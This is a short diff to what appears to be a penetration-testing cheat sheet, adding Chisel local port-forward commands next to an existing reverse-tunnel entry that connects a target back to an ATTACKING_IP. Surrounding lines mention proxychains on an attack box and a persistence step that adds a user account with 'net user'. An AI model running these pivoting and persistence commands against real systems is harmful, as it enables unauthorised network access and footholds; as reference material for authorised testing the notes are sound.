@@ -131,6 +131,9 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
 ### Chisel Remote Port Forward 
     attack    ./chisel server -p LISTEN_PORT --reverse &  
     target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
+### Chisel Local Port Forward 
+    target    ./chisel server -p LISTEN_PORT 
+    attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
  ____
  # Persistence
      net user USERNAME PASSWORD /add
